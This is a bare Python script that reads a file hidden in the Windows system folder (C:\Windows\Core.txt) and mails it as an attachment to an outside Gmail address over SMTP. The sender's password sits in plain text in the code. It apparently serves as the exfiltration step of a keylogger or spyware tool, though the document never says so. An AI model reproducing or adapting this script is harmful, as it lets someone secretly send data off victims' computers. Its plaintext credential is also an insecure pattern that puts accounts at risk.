#!/usr/bin/python

import os 

import time

import smtplib

from email.message import EmailMessage

sender_email = "eliotaunderson123@gmail.com"

rec_email = "backuputkarsh190601@gmail.com"

password = "googlesucks" 

msg = EmailMessage()

msg['From'] = sender_email

msg['To'] = rec_email 

with open('C:\\Windows\\Core.txt','rb') as f:
    file_data = f.read()
    file_name = f.name 

msg.add_attachment(file_data,maintype='application',subtype='octet-stream',filename=file_name)


with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
    smtp.login(sender_email,password)
    smtp.send_message(msg)

